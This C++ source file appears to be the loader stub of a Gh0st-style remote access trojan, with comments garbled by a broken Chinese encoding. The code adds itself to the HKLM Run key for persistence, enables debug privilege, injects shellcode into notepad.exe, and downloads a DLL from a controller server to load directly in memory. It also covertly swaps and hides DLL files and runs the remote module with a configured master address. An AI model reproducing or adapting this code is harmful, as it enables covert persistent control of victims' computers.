
#include "StdAfx.h"
#include "MemoryModule.h"
#include "ShellcodeInj.h"
#include <WS2tcpip.h>
#include <common/commands.h>
#include "common/dllRunner.h"
#pragma comment(lib, "ws2_32.lib")

// �Զ�����ע����е�ֵ
#define REG_NAME "a_ghost"

typedef void (*StopRun)();

typedef bool (*IsStoped)();

typedef BOOL (*IsExit)();

// ֹͣ��������
StopRun stop = NULL;

// �Ƿ�ɹ�ֹͣ
IsStoped bStop = NULL;

// �Ƿ��˳����ض�
IsExit bExit = NULL;

BOOL status = 0;

HANDLE hEvent = NULL;

CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION, 0, Startup_InjSC };

//����Ȩ��
void DebugPrivilege()
{
	HANDLE hToken = NULL;
	//�򿪵�ǰ���̵ķ�������
	int hRet = OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken);

	if( hRet)
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		//ȡ������Ȩ�޵�LUID
		LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		//�����������Ƶ�Ȩ��
		AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);

		CloseHandle(hToken);
	}
}

/** 
* @brief ���ñ�����������
* @param[in] *sPath ע����·��
* @param[in] *sNmae ע���������
* @return ����ע����
* @details Win7 64λ�����ϲ��Խ��������ע�����ڣ�\n
* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
* @note �״�������Ҫ�Թ���ԱȨ�����У�������ע���д�뿪��������
*/
BOOL SetSelfStart(const char *sPath, const char *sNmae)
{
	DebugPrivilege();

	// д���ע���·��
#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"

	// ��ע�����д��������Ϣ
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);

	// �ж��Ƿ�ɹ�
	if(lRet != ERROR_SUCCESS)
		return FALSE;

	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);

	// �ر�ע���
	RegCloseKey(hKey);

	// �ж��Ƿ�ɹ�
	return lRet == ERROR_SUCCESS;
}

BOOL CALLBACK callback(DWORD CtrlType)
{
	if (CtrlType == CTRL_CLOSE_EVENT)
	{
		status = 1;
		if (hEvent) SetEvent(hEvent);
		if(stop) stop();
		while(1==status)
			Sleep(20);
	}
	return TRUE;
}

// ���г���.
BOOL Run(const char* argv1, int argv2);

// Package header.
typedef struct PkgHeader {
	char flag[8];
	int totalLen;
	int originLen;
	PkgHeader(int size) {
		memset(flag, 0, sizeof(flag));
		memcpy(flag, "Hello?", 6);
		originLen = size;
		totalLen = sizeof(PkgHeader) + size;
	}
}PkgHeader;

// Memory DLL runner.
class MemoryDllRunner : public DllRunner {
protected:
	HMEMORYMODULE m_mod;
	std::string GetIPAddress(const char* hostName)
	{
		// 1. �ж��ǲ��ǺϷ��� IPv4 ��ַ
		sockaddr_in sa;
		if (inet_pton(AF_INET, hostName, &(sa.sin_addr)) == 1) {
			// �ǺϷ� IPv4 ��ַ��ֱ�ӷ���
			return std::string(hostName);
		}

		// 2. �����Խ�������
		addrinfo hints = {}, * res = nullptr;
		hints.ai_family = AF_INET; // ֻ֧�� IPv4
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		if (getaddrinfo(hostName, nullptr, &hints, &res) != 0)
			return "";

		char ipStr[INET_ADDRSTRLEN] = {};
		sockaddr_in* ipv4 = (sockaddr_in*)res->ai_addr;
		inet_ntop(AF_INET, &(ipv4->sin_addr), ipStr, INET_ADDRSTRLEN);

		freeaddrinfo(res);
		return std::string(ipStr);
	}
public:
	MemoryDllRunner() : m_mod(nullptr){}
	virtual const char* ReceiveDll(int &size) {
		WSADATA wsaData = {};
		if (WSAStartup(MAKEWORD(2, 2), &wsaData))
			return nullptr;

		const int bufSize = 4 * 1024 * 1024;
		char* buffer = new char[bufSize];
		bool isFirstConnect = true;

		do {
			if (!isFirstConnect)
				Sleep(5000);

			isFirstConnect = false;
			SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if (clientSocket == INVALID_SOCKET) {
				continue;
			}

			DWORD timeout = 5000;
			setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

			sockaddr_in serverAddr = {};
			serverAddr.sin_family = AF_INET;
			serverAddr.sin_port = htons(g_ConnectAddress.ServerPort());
			std::string ip = GetIPAddress(g_ConnectAddress.ServerIP());
			serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
			if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
				closesocket(clientSocket);
				continue;
			}
#ifdef _DEBUG
			char command[4] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 0 };
#else
			char command[4] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 1 };
#endif
			char req[sizeof(PkgHeader) + 4] = {};
			memcpy(req, &PkgHeader(4), sizeof(PkgHeader));
			memcpy(req + sizeof(PkgHeader), command, sizeof(command));
			auto bytesSent = send(clientSocket, req, sizeof(req), 0);
			if (bytesSent != sizeof(req)) {
				closesocket(clientSocket);
				continue;
			}
			char* ptr = buffer + sizeof(PkgHeader);
			int bufferSize = 16 * 1024, bytesReceived = 0, totalReceived = 0;
			while (totalReceived < bufSize) {
				int bytesToReceive = min(bufferSize, bufSize - totalReceived);
				int bytesReceived = recv(clientSocket, buffer + totalReceived, bytesToReceive, 0);
				if (bytesReceived <= 0) break;
				totalReceived += bytesReceived;
			}
			if (totalReceived < sizeof(PkgHeader) + 6) {
				closesocket(clientSocket);
				continue;
			}
			BYTE cmd = ptr[0], type = ptr[1];
			size = 0;
			memcpy(&size, ptr + 2, sizeof(int));
			if (totalReceived != size + 6 + sizeof(PkgHeader)) {
				continue;
			}
			closesocket(clientSocket);
		} while (false);

		WSACleanup();
		return buffer;
	}
	// Request DLL from the master.
	virtual void* LoadLibraryA(const char* path, int len = 0) {
		int size = 0;
		auto buffer = ReceiveDll(size);
		if (nullptr == buffer || size == 0){
			SAFE_DELETE_ARRAY(buffer);
			return nullptr;
		}
		int pos = MemoryFind(buffer, FLAG_FINDEN, size, sizeof(FLAG_FINDEN) - 1);
		if (-1 != pos) {
			CONNECT_ADDRESS* addr = (CONNECT_ADDRESS*)(buffer + pos);
			BYTE type = buffer[sizeof(PkgHeader) + 1];
			addr->iType = type == MEMORYDLL ? CLIENT_TYPE_MEMDLL : CLIENT_TYPE_SHELLCODE;
			memset(addr->szFlag, 0, sizeof(addr->szFlag));
			strcpy(addr->szServerIP, g_ConnectAddress.ServerIP());
			sprintf_s(addr->szPort, "%d", g_ConnectAddress.ServerPort());
		}
		m_mod = ::MemoryLoadLibrary(buffer + 6 + sizeof(PkgHeader), size);
		SAFE_DELETE_ARRAY(buffer);
		return m_mod;
	}
	virtual FARPROC GetProcAddress(void* mod, const char* lpProcName) {
		return ::MemoryGetProcAddress((HMEMORYMODULE)mod, lpProcName);
	}
	virtual BOOL FreeLibrary(void* mod) {
		::MemoryFreeLibrary((HMEMORYMODULE)mod);
		return TRUE;
	}
};

// @brief ���ȶ�ȡsettings.ini�����ļ�����ȡIP�Ͷ˿�.
// [settings] 
// localIp=XXX
// ghost=6688
// ��������ļ������ھʹ��������л�ȡIP�Ͷ˿�.
int main(int argc, const char *argv[])
{
	if(!SetSelfStart(argv[0], REG_NAME))
	{
		Mprintf("���ÿ���������ʧ�ܣ����ù���ԱȨ������.\n");
	}
	status = 0;
	SetConsoleCtrlHandler(&callback, TRUE);
	
	// �� Shell code ���ӱ���6543�˿ڣ�ע�뵽���±�
	if (g_ConnectAddress.iStartup == Startup_InjSC)
	{
		// Try to inject shell code to `notepad.exe`
		// If failed then run memory DLL
		ShellcodeInj inj;
		int pid = 0;
		hEvent = ::CreateEventA(NULL, TRUE, FALSE, NULL);
		do {
			if (sizeof(void*) == 4) // Shell code is 64bit
				break;
			if (!(pid = inj.InjectProcess(nullptr))) {
				break;
			}
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pid);
			if (hProcess == NULL) {
				break;
			}
			Mprintf("Inject process [%d] succeed.\n", pid);
			HANDLE handles[2] = { hProcess, hEvent };
			DWORD waitResult = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
			if (status == 1) {
				TerminateProcess(hProcess, -1);
				CloseHandle(hEvent);
			}
			CloseHandle(hProcess);
			Mprintf("Process [%d] is finished.\n", pid);
			if (status == 1)
				return -1;
		} while (pid);
	}

	if (g_ConnectAddress.iStartup == Startup_InjSC) {
		g_ConnectAddress.iStartup = Startup_MEMDLL;
	}

	do {
		BOOL ret = Run(argc > 1 ? argv[1] : (strlen(g_ConnectAddress.ServerIP()) == 0 ? "127.0.0.1" : g_ConnectAddress.ServerIP()),
			argc > 2 ? atoi(argv[2]) : (g_ConnectAddress.ServerPort() == 0 ? 6543 : g_ConnectAddress.ServerPort()));
		if (ret == 1) {
			return -1;
		}
	} while (status == 0);

	status = 0;
	return -1;
}

// ���������в���: IP �� �˿�.
BOOL Run(const char* argv1, int argv2) {
	BOOL result = FALSE;
	char path[_MAX_PATH], * p = path;
	GetModuleFileNameA(NULL, path, sizeof(path));
	while (*p) ++p;
	while ('\\' != *p) --p;
	*(p + 1) = 0;
	std::string folder = path;
	std::string oldFile = folder + "ServerDll.old";
	std::string newFile = folder + "ServerDll.new";
	strcpy(p + 1, "ServerDll.dll");
	BOOL ok = TRUE;
	if (_access(newFile.c_str(), 0) != -1) {
		if (_access(oldFile.c_str(), 0) != -1)
		{
			if (!DeleteFileA(oldFile.c_str()))
			{
				Mprintf("Error deleting file. Error code: %d\n", GetLastError());
				ok = FALSE;
			}
		}
		if (ok && !MoveFileA(path, oldFile.c_str())) {
			Mprintf("Error removing file. Error code: %d\n", GetLastError());
			ok = FALSE;
		}else {
			// �����ļ�����Ϊ����
			if (SetFileAttributesA(oldFile.c_str(), FILE_ATTRIBUTE_HIDDEN))
			{
				Mprintf("File created and set to hidden: %s\n",oldFile.c_str());
			}
		}
		if (ok && !MoveFileA(newFile.c_str(), path)) {
			Mprintf("Error removing file. Error code: %d\n", GetLastError());
			MoveFileA(oldFile.c_str(), path);// recover
		}else if (ok){
			Mprintf("Using new file: %s\n", newFile.c_str());
		}
	}
	DllRunner* runner = nullptr;
	switch (g_ConnectAddress.iStartup)
	{
	case Startup_DLL:
		runner = new DefaultDllRunner;
		break;
	case Startup_MEMDLL:
		runner = new MemoryDllRunner;
		break;
	default:
		ExitProcess(-1);
		break;
	}

	void* hDll = runner->LoadLibraryA(path);
	typedef void (*TestRun)(char* strHost, int nPort);
	TestRun run = hDll ? TestRun(runner->GetProcAddress(hDll, "TestRun")) : NULL;
	stop = hDll ? StopRun(runner->GetProcAddress(hDll, "StopRun")) : NULL;
	bStop = hDll ? IsStoped(runner->GetProcAddress(hDll, "IsStoped")) : NULL;
	bExit = hDll ? IsExit(runner->GetProcAddress(hDll, "IsExit")) : NULL;
	if (NULL == run) {
		if (hDll) runner->FreeLibrary(hDll);
		Mprintf("���ض�̬���ӿ�\"ServerDll.dll\"ʧ��. �������: %d\n", GetLastError());
		Sleep(3000);
		delete runner;
		return FALSE;
	}
	do 
	{
		char ip[_MAX_PATH];
		strcpy_s(ip, g_ConnectAddress.ServerIP());
		int port = g_ConnectAddress.ServerPort();
		strcpy(p + 1, "settings.ini");
		if (_access(path, 0) == -1) { // �ļ�������: ���ȴӲ�����ȡֵ������Ǵ�g_ConnectAddressȡֵ.
			strcpy(ip, argv1);
			port = argv2;
		}
		else {
			GetPrivateProfileStringA("settings", "master", g_ConnectAddress.ServerIP(), ip, _MAX_PATH, path);
			port = GetPrivateProfileIntA("settings", "ghost", g_ConnectAddress.ServerPort(), path);
		}
		Mprintf("[server] %s:%d\n", ip, port);
		do
		{
			run(ip, port);
			while (bStop && !bStop() && 0 == status)
				Sleep(20);
		} while (bExit && !bExit() && 0 == status);

		while (bStop && !bStop() && 1 == status)
			Sleep(20);
		if (bExit) {
			result = bExit();
		}
	} while (result == 2);
	if (!runner->FreeLibrary(hDll)) {
		Mprintf("�ͷŶ�̬���ӿ�\"ServerDll.dll\"ʧ��. �������: %d\n", GetLastError());
	}
	else {
		Mprintf("�ͷŶ�̬���ӿ�\"ServerDll.dll\"�ɹ�!\n");
	}
	delete runner;
	return result;
}
